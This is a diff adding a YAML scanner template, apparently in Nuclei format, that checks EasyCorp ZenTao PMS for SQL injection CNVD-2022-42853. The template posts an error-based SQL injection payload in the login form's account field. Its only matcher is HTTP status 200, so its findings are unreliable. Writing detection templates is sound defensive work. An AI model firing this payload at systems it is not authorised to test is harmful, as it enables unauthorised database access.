@@ -1,0 +1,22 @@
+id: yaml-poc-easycorp-zentao_pms-sql_injection-CNVD-2022-42853
+info:
+  name: Yaml Poc Easycorp Zentao_Pms Sql_Injection Cnvd 2022 42853
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-easycorp-zentao_pms-sql_injection-CNVD-2022-42853'
+  tags: sqli
+  reference:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853
+http:
+- method: POST
+  path:
+  - /zentao/user-login.html
+  body: account=admin'+and+(select+extractvalue(1,concat(0x7e,(select+SUBSTR(MD5({{rand}}),9,16)),0x7e)))#
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Referer: http://{{url}}/zentao/user-login.html
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
